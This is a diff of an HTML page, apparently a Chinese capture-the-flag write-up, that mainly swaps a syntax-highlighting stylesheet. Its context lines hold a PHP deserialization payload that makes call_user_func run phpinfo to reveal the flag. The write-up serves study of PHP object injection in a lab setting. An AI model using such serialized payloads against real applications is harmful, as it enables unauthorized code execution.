@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/base16/-gigavolt.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -246,7 +254,7 @@
 <li><code>call_user_func</code>——&gt;把第一个参数作为回调函数调用       </li>
 </ol>
 <p>flag在phpinfo中<br>payload：     </p>
-<div class="hljs"><pre><code>```php
+<pre><code>```php
 &lt;?php
 calss HelloPhp
 &#123;
@@ -260,7 +268,7 @@ echo urlencode(serialize($test));
 //结果
 
 O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;&#125;   
-```        </code></pre></div>
+```        </code></pre>
 <p>我看有些师傅的WP序列化之前urlencode了一下，这里不加也可       </p>
 <p>但我想到之前做过的一道ACTF的题，也是<code>$b($a)</code>的形式，那道题就必须要urlencode，所以保险起见，还是加上吧     </p>
 <p>assert和eval的区别：      </p>
@@ -412,6 +420,8 @@ O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&
 
 
 
+  
+    
   
 
 
